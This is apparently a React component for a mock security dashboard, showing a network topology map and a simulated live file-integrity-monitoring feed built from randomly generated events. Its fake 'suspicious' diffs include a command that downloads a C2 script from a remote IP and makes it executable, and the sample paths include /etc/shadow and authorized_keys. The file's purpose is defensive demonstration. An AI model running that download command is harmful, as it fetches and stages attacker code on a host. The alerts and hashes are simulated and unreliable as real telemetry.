import { useState, useEffect, useCallback } from "react"

const NODES = [
  { id: "FIREWALL-01", type: "firewall", x: 340, y: 55, status: "healthy", ip: "10.0.0.1" },
  { id: "IDS-SENSOR", type: "sensor", x: 530, y: 100, status: "sensor", ip: "10.0.0.5" },
  { id: "ROUTER-CORE", type: "router", x: 340, y: 155, status: "healthy", ip: "10.1.0.1" },
  { id: "SW-01", type: "switch", x: 160, y: 230, status: "warning", ip: "10.1.0.2" },
  { id: "SW-02", type: "switch", x: 520, y: 230, status: "healthy", ip: "10.1.0.3" },
  { id: "DC-01", type: "server", x: 340, y: 265, status: "healthy", ip: "10.1.1.10" },
  { id: "WS-042", type: "workstation", x: 80, y: 330, status: "critical", ip: "10.1.5.42" },
  { id: "WS-018", type: "workstation", x: 220, y: 340, status: "healthy", ip: "10.1.5.18" },
  { id: "DB-SRV-01", type: "server", x: 430, y: 335, status: "healthy", ip: "10.1.2.10" },
  { id: "WEB-SRV-01", type: "server", x: 600, y: 300, status: "healthy", ip: "10.1.3.10" },
]

const EDGES = [
  ["FIREWALL-01", "IDS-SENSOR"],
  ["FIREWALL-01", "ROUTER-CORE"],
  ["ROUTER-CORE", "SW-01"],
  ["ROUTER-CORE", "SW-02"],
  ["ROUTER-CORE", "DC-01"],
  ["SW-01", "WS-042"],
  ["SW-01", "WS-018"],
  ["SW-02", "DB-SRV-01"],
  ["SW-02", "WEB-SRV-01"],
]

const STATUS_COLORS: Record<string, string> = {
  healthy: "#10b981",
  warning: "#f59e0b",
  critical: "#ef4444",
  sensor: "#00d4ff",
}

function makeHash() {
  return Array.from({ length: 64 }, () => "0123456789abcdef"[Math.floor(Math.random() * 16)]).join("")
}

const PATHS = [
  "/etc/passwd", "/etc/shadow", "/usr/bin/ssh", "/var/log/auth.log",
  "/home/jsmith/.bashrc", "/usr/local/bin/run.sh", "/etc/crontab",
  "/var/www/html/index.php", "/usr/sbin/sshd", "/etc/hosts",
  "/opt/app/config.json", "/usr/bin/curl", "/home/bwilson/.ssh/authorized_keys",
  "/etc/sudoers", "/tmp/payload.elf", "/usr/lib/x86_64-linux-gnu/libssl.so.3",
]
const HOSTS = ["WS-042", "WS-018", "DC-01", "DB-SRV-01", "WEB-SRV-01"]
const USERS = ["root", "jsmith", "bwilson", "syslog", "www-data", "uid=1001(deploy)"]
const ACTIONS_FIM = ["MODIFIED", "ADDED", "DELETED"]
const JUDGMENTS: Array<"Benign" | "Suspicious"> = ["Benign", "Benign", "Benign", "Suspicious"]

function genFIMEvent(): FIMEvent {
  const suspicious = Math.random() < 0.25
  const action = suspicious ? ACTIONS_FIM[Math.floor(Math.random() * 2)] : ACTIONS_FIM[Math.floor(Math.random() * 3)]
  const host = suspicious ? "WS-042" : HOSTS[Math.floor(Math.random() * HOSTS.length)]
  const user = suspicious ? (Math.random() < 0.5 ? "root" : "uid=1001(deploy)") : USERS[Math.floor(Math.random() * USERS.length)]
  const path = suspicious
    ? ["/tmp/payload.elf", "/usr/local/bin/run.sh", "/etc/sudoers", "/home/bwilson/.ssh/authorized_keys"][Math.floor(Math.random() * 4)]
    : PATHS[Math.floor(Math.random() * PATHS.length)]

  return {
    id: Math.random().toString(36).slice(2),
    ts: new Date().toISOString().replace("T", " ").slice(0, 19),
    host,
    path,
    action: action as "MODIFIED" | "ADDED" | "DELETED",
    hash: makeHash(),
    user,
    judgment: suspicious ? "Suspicious" : "Benign",
    diff: suspicious ? {
      removed: [`-rw-r--r-- 1 root root 2048 Jan 1 00:00 ${path}`, `# old content line`, `-exec command --arg`],
      added: [`-rwsr-xr-x 1 root root 4096 ${new Date().toLocaleDateString()} ${path}`, `# injected payload`, `+wget http://185.220.101.45/c2.sh -O /tmp/c2.sh && chmod +x /tmp/c2.sh`],
    } : null,
  }
}

interface FIMEvent {
  id: string; ts: string; host: string; path: string
  action: "MODIFIED" | "ADDED" | "DELETED"; hash: string; user: string
  judgment: "Benign" | "Suspicious"
  diff: { removed: string[]; added: string[] } | null
}

export default function FleetManagement() {
  const [events, setEvents] = useState<FIMEvent[]>(() => Array.from({ length: 8 }, genFIMEvent))
  const [selectedNode, setSelectedNode] = useState<string | null>(null)
  const [diffEvent, setDiffEvent] = useState<FIMEvent | null>(null)

  useEffect(() => {
    const t = setInterval(() => {
      setEvents((prev) => [genFIMEvent(), ...prev].slice(0, 50))
    }, 2800)
    return () => clearInterval(t)
  }, [])

  const getNode = (id: string) => NODES.find((n) => n.id === id)!

  return (
    <div style={{ display: "flex", height: "100%", gap: 0 }}>
      {/* Left: Topology */}
      <div style={{ width: 700, minWidth: 700, background: "#0d1629", borderRight: "1px solid #1a2d4f", display: "flex", flexDirection: "column" }}>
        <div style={{ padding: "14px 16px 10px", borderBottom: "1px solid #0f1e35", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
          <div>
            <div style={{ fontSize: 12, fontWeight: 600, color: "#c8d8ea" }}>Node Topology Map</div>
            <div style={{ fontSize: 10, color: "#3d5a7a", marginTop: 2 }}>{NODES.length} nodes · 1 compromised · real-time agent telemetry</div>
          </div>
          <div style={{ display: "flex", gap: 10, fontSize: 10, fontFamily: "JetBrains Mono, monospace" }}>
            {Object.entries(STATUS_COLORS).map(([k, c]) => (
              <span key={k} style={{ color: c, display: "flex", alignItems: "center", gap: 4 }}>
                <span style={{ width: 8, height: 8, background: c, borderRadius: "50%", display: "inline-block" }} />
                {k.charAt(0).toUpperCase() + k.slice(1)}
              </span>
            ))}
          </div>
        </div>
        <div style={{ flex: 1, position: "relative", overflow: "hidden" }}>
          <svg width="100%" height="100%" viewBox="0 0 700 420" style={{ display: "block" }}>
            <defs>
              <filter id="glow">
                <feGaussianBlur stdDeviation="3" result="coloredBlur" />
                <feMerge><feMergeNode in="coloredBlur" /><feMergeNode in="SourceGraphic" /></feMerge>
              </filter>
            </defs>

            {/* Edges */}
            {EDGES.map(([a, b]) => {
              const na = getNode(a), nb = getNode(b)
              const criticalEdge = na.status === "critical" || nb.status === "critical"
              return (
                <line key={a + b}
                  x1={na.x} y1={na.y} x2={nb.x} y2={nb.y}
                  stroke={criticalEdge ? "#ef444433" : "#1a2d4f"}
                  strokeWidth={criticalEdge ? 1.5 : 1}
                  strokeDasharray={criticalEdge ? "4 4" : undefined}
                />
              )
            })}

            {/* Nodes */}
            {NODES.map((node) => {
              const color = STATUS_COLORS[node.status]
              const active = selectedNode === node.id
              const isCritical = node.status === "critical"
              return (
                <g key={node.id} onClick={() => setSelectedNode(active ? null : node.id)} style={{ cursor: "pointer" }}>
                  {isCritical && (
                    <circle cx={node.x} cy={node.y} r={24} fill={color} opacity={0.08} filter="url(#glow)">
                      <animate attributeName="r" values="18;28;18" dur="2s" repeatCount="indefinite" />
                      <animate attributeName="opacity" values="0.08;0.02;0.08" dur="2s" repeatCount="indefinite" />
                    </circle>
                  )}
                  <circle cx={node.x} cy={node.y} r={active ? 17 : 14}
                    fill={`${color}22`}
                    stroke={color}
                    strokeWidth={active ? 2 : 1.5}
                    filter={active ? "url(#glow)" : undefined}
                    style={{ transition: "all 0.2s" }}
                  />
                  <text x={node.x} y={node.y + 4} textAnchor="middle" fill={color} fontSize={10} fontWeight={700} fontFamily="JetBrains Mono, monospace">
                    {node.type === "firewall" ? "FW" : node.type === "router" ? "RT" : node.type === "switch" ? "SW" : node.type === "sensor" ? "IDS" : node.type === "server" ? "SRV" : "WS"}
                  </text>
                  <text x={node.x} y={node.y + 28} textAnchor="middle" fill="#8aa8c8" fontSize={9} fontFamily="JetBrains Mono, monospace">{node.id}</text>
                  <text x={node.x} y={node.y + 39} textAnchor="middle" fill="#3d5a7a" fontSize={8} fontFamily="JetBrains Mono, monospace">{node.ip}</text>
                </g>
              )
            })}
          </svg>
        </div>

        {/* Node detail panel */}
        {selectedNode && (() => {
          const n = getNode(selectedNode)
          const color = STATUS_COLORS[n.status]
          return (
            <div style={{ padding: "12px 16px", borderTop: "1px solid #0f1e35", background: "#080f1f" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <div style={{ display: "flex", gap: 12, alignItems: "center" }}>
                  <div style={{ width: 8, height: 8, borderRadius: "50%", background: color }} />
                  <span style={{ fontSize: 12, fontWeight: 600, color: "#c8d8ea", fontFamily: "JetBrains Mono, monospace" }}>{n.id}</span>
                  <span style={{ fontSize: 10, color: color, background: color + "22", padding: "2px 8px", borderRadius: 4, border: `1px solid ${color}44` }}>{n.status.toUpperCase()}</span>
                </div>
                <div style={{ fontSize: 10, fontFamily: "JetBrains Mono, monospace", color: "#3d5a7a" }}>IP: {n.ip} · Type: {n.type}</div>
              </div>
              {n.status === "critical" && (
                <div style={{ marginTop: 8, padding: "8px 10px", background: "#ef444411", border: "1px solid #ef444433", borderRadius: 6, fontSize: 10, color: "#ef4444" }}>
                  ⚠ COMPROMISED — Active lateral movement detected. Autonomous quarantine in effect. FIM alerts: 7 in last 30m.
                </div>
              )}
            </div>
          )
        })()}
      </div>

      {/* Right: FIM Table */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>
        <div style={{ padding: "14px 16px 10px", borderBottom: "1px solid #1a2d4f", display: "flex", justifyContent: "space-between", alignItems: "center", flexShrink: 0 }}>
          <div>
            <div style={{ fontSize: 12, fontWeight: 600, color: "#c8d8ea" }}>FIM Live Feed</div>
            <div style={{ fontSize: 10, color: "#3d5a7a", marginTop: 2 }}>SHA-256 integrity stream · click row to view diff</div>
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 10, fontFamily: "JetBrains Mono, monospace", color: "#10b981" }}>
            <div className="dot-pulse" style={{ width: 6, height: 6, borderRadius: "50%", background: "#10b981" }} />
            LIVE
          </div>
        </div>

        <div style={{ overflowX: "auto", overflowY: "auto", flex: 1 }}>
          <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 10, fontFamily: "JetBrains Mono, monospace", minWidth: 800 }}>
            <thead>
              <tr style={{ borderBottom: "1px solid #0f1e35", position: "sticky", top: 0, background: "#0d1629", zIndex: 1 }}>
                {["Timestamp", "Host", "Path", "Action", "SHA-256", "User", "Judgment"].map((h) => (
                  <th key={h} style={{ padding: "8px 10px", textAlign: "left", color: "#3d5a7a", fontWeight: 500, fontSize: 9, letterSpacing: "0.05em", whiteSpace: "nowrap" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {events.map((ev, i) => {
                const isSusp = ev.judgment === "Suspicious"
                const actionColor = ev.action === "DELETED" ? "#ef4444" : ev.action === "ADDED" ? "#10b981" : "#f59e0b"
                return (
                  <tr
                    key={ev.id}
                    className={i === 0 ? "row-appear" : ""}
                    onClick={() => ev.diff && setDiffEvent(ev)}
                    style={{
                      borderBottom: "1px solid #0a1222",
                      background: isSusp ? "#ef444408" : "transparent",
                      cursor: ev.diff ? "pointer" : "default",
                    }}
                  >
                    <td style={{ padding: "7px 10px", color: "#3d5a7a", whiteSpace: "nowrap" }}>{ev.ts}</td>
                    <td style={{ padding: "7px 10px", color: isSusp ? "#ef4444" : "#8aa8c8", fontWeight: isSusp ? 600 : 400 }}>{ev.host}</td>
                    <td style={{ padding: "7px 10px", color: "#c8d8ea", maxWidth: 220, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{ev.path}</td>
                    <td style={{ padding: "7px 10px" }}>
                      <span style={{ color: actionColor, background: actionColor + "22", padding: "1px 6px", borderRadius: 3, fontSize: 9 }}>{ev.action}</span>
                    </td>
                    <td style={{ padding: "7px 10px", color: "#3d5a7a", maxWidth: 120, overflow: "hidden", textOverflow: "ellipsis" }}>{ev.hash.slice(0, 16)}…</td>
                    <td style={{ padding: "7px 10px", color: isSusp ? "#f59e0b" : "#5a7a9a" }}>{ev.user}</td>
                    <td style={{ padding: "7px 10px" }}>
                      <span style={{
                        color: isSusp ? "#ef4444" : "#10b981",
                        background: isSusp ? "#ef444422" : "#10b98122",
                        border: `1px solid ${isSusp ? "#ef444444" : "#10b98144"}`,
                        padding: "2px 7px", borderRadius: 4, fontSize: 9,
                      }}>
                        {isSusp ? "⚠ Suspicious" : "✓ Benign"}
                      </span>
                    </td>
                  </tr>
                )
              })}
            </tbody>
          </table>
        </div>
      </div>

      {/* Diff Modal */}
      {diffEvent && (
        <div
          onClick={() => setDiffEvent(null)}
          style={{
            position: "fixed", inset: 0, background: "#000000bb", zIndex: 50,
            display: "flex", alignItems: "center", justifyContent: "center",
          }}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              background: "#0d1629", border: "1px solid #1a2d4f", borderRadius: 10,
              width: 700, maxHeight: "80vh", overflow: "hidden", display: "flex", flexDirection: "column",
            }}
          >
            <div style={{ padding: "14px 16px", borderBottom: "1px solid #0f1e35", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <div>
                <div style={{ fontSize: 12, fontWeight: 600, color: "#ef4444" }}>⚠ File Diff Viewer — Suspicious Modification</div>
                <div style={{ fontSize: 10, color: "#3d5a7a", fontFamily: "JetBrains Mono, monospace", marginTop: 2 }}>{diffEvent.path} · {diffEvent.host} · {diffEvent.ts}</div>
              </div>
              <button onClick={() => setDiffEvent(null)} style={{ background: "none", border: "none", color: "#5a7a9a", cursor: "pointer", fontSize: 18 }}>✕</button>
            </div>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", flex: 1, overflow: "hidden" }}>
              <div style={{ padding: 16, borderRight: "1px solid #0f1e35", overflow: "auto" }}>
                <div style={{ fontSize: 10, color: "#3d5a7a", fontFamily: "JetBrains Mono, monospace", marginBottom: 8 }}>BEFORE</div>
                {diffEvent.diff!.removed.map((line, i) => (
                  <div key={i} style={{ background: "#ef444411", border: "1px solid #ef444422", borderRadius: 3, padding: "4px 8px", marginBottom: 4, fontSize: 11, fontFamily: "JetBrains Mono, monospace", color: "#ef4444", whiteSpace: "pre-wrap", wordBreak: "break-all" }}>{line}</div>
                ))}
              </div>
              <div style={{ padding: 16, overflow: "auto" }}>
                <div style={{ fontSize: 10, color: "#3d5a7a", fontFamily: "JetBrains Mono, monospace", marginBottom: 8 }}>AFTER</div>
                {diffEvent.diff!.added.map((line, i) => (
                  <div key={i} style={{ background: "#10b98111", border: "1px solid #10b98122", borderRadius: 3, padding: "4px 8px", marginBottom: 4, fontSize: 11, fontFamily: "JetBrains Mono, monospace", color: "#10b981", whiteSpace: "pre-wrap", wordBreak: "break-all" }}>{line}</div>
                ))}
              </div>
            </div>
            <div style={{ padding: "10px 16px", borderTop: "1px solid #0f1e35", background: "#080f1f", display: "flex", gap: 10, justifyContent: "flex-end" }}>
              <div style={{ fontSize: 10, color: "#5a7a9a", flex: 1, fontFamily: "JetBrains Mono, monospace" }}>SHA-256: {diffEvent.hash}</div>
              <button style={{ padding: "6px 14px", background: "#ef444422", border: "1px solid #ef444466", borderRadius: 6, color: "#ef4444", cursor: "pointer", fontSize: 11, fontFamily: "JetBrains Mono, monospace" }}>Investigate via AI</button>
              <button style={{ padding: "6px 14px", background: "#8b5cf622", border: "1px solid #8b5cf666", borderRadius: 6, color: "#8b5cf6", cursor: "pointer", fontSize: 11, fontFamily: "JetBrains Mono, monospace" }}>Quarantine Host</button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
